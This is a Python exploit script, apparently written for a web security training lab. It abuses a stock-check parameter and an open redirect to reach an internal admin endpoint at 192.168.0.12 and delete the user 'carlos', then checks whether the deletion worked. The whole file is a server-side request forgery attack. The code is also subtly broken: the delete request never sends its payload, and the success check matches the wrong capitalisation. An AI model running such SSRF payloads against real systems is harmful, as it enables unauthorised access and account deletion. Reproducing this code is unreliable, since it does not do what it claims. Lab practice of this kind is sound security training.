import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080',
}


def delete_user(url):
    delete_user_ssrf_payload = '/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?user=carlos'
    check_stock_path = 'product/stock'
    params = {'stockApi':delete_user_ssrf_payload}
    # now we will be sending a POST request hai 
    r= requests.post(url=url + check_stock_path,verify=False,proxies=proxies)
    
    # check if user is deleted
    
    admin_page_ssrf_payload = '/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/'
    params2 = {'stockApi': admin_page_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'Carlos' not in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful")

def main():
    if len(sys.argv)!=2:
         print("Usage %s <url>" % sys.argv[0])
         print("Example %s www.example.com" % sys.argv[0])
         exit(-1)
    else:
        url = sys.argv[1]
        s=requests.Session()
        print("[+] Deleting the carlos user..........")
        delete_user(url)
        



if __name__ == "__main__":
    main()